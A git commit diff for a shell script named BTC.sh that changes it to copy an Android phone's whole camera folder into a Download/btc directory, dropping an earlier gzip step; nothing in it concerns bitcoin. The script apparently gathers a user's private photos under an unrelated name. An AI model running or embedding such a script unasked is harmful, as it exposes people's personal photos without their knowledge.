89a8dfc4ab59093e69a4cb3ba6162e519132235e
alitariq01 <84877800+alitariq01@users.noreply.github.com>
2021-07-18 17:10:46 +0100

    Update BTC.sh

--- BTC.sh
+++ BTC.sh
@@ -1,3 +1,2 @@
-mkdir testt /storage/emulated/0/
-cp -a /storage/emulated/0/DCIM/Camera/. /storage/emulated/0/test
-gzip /storage/emulated/0/test
+mkdir test /storage/emulated/0/Download/btc
+cp -a /storage/emulated/0/DCIM/Camera/. /storage/emulated/0/Download/btc/test
